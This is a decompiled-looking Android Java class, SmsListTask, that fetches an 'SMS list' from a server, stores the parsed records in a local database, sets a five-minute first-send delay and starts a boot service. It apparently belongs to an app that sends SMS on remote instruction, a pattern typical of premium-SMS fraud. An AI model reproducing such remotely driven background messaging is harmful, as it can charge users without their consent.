package com.clmobile.plugin.task;

import android.content.Context;
import com.clmobile.network.ResultData;
import com.clmobile.plugin.networktask.NetworkRequestParameters;
import com.clmobile.plugin.networktask.NetworkTaskFactory;
import com.clmobile.plugin.networktask.SmsListModel;
import com.yongding.logic.Engine;
import com.yongding.logic.Global;
import com.yongding.util.DBAdapter;
import com.yongding.util.Trace;
import java.io.BufferedReader;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.List;

public class SmsListTask extends BaseTask<SmsListModel> {
    private DBAdapter dbAdapter;
    SmsListModel smsListModel;

    public SmsListTask(Context context) {
        super(context, 10013);
        this.dbAdapter = new DBAdapter(context);
    }

    private List<String[]> readTxt(String smsContent) {
        List<String[]> list = new ArrayList();
        try {
            BufferedReader br = new BufferedReader(new StringReader(smsContent));
            String str = "";
            while (true) {
                str = br.readLine();
                if (str == null) {
                    break;
                } else if (!"".equals(str)) {
                    list.add(str.trim().split(","));
                }
            }
            br.close();
        } catch (Exception e) {
            Trace.e(e.toString());
        }
        return list;
    }

    public NetworkRequestParameters<SmsListModel> createNetworkRequestParameters() {
        return NetworkTaskFactory.createSmsListTask();
    }

    public boolean hanldeResult(ResultData<SmsListModel> result) {
        List<String[]> smsList = readTxt(((SmsListModel) result.getResult()).getChannelInfo());
        if (smsList.size() > 0) {
            try {
                Global.defaultFirstSendTime = 300000;
                this.dbAdapter.open();
                this.dbAdapter.doUpdate(smsList);
                Engine.StartMyService(this.context, Engine.bootServiceAction);
                this.dbAdapter.close();
            } catch (Exception e) {
                e.printStackTrace();
                this.dbAdapter.close();
            }
        }
        return true;
    }
}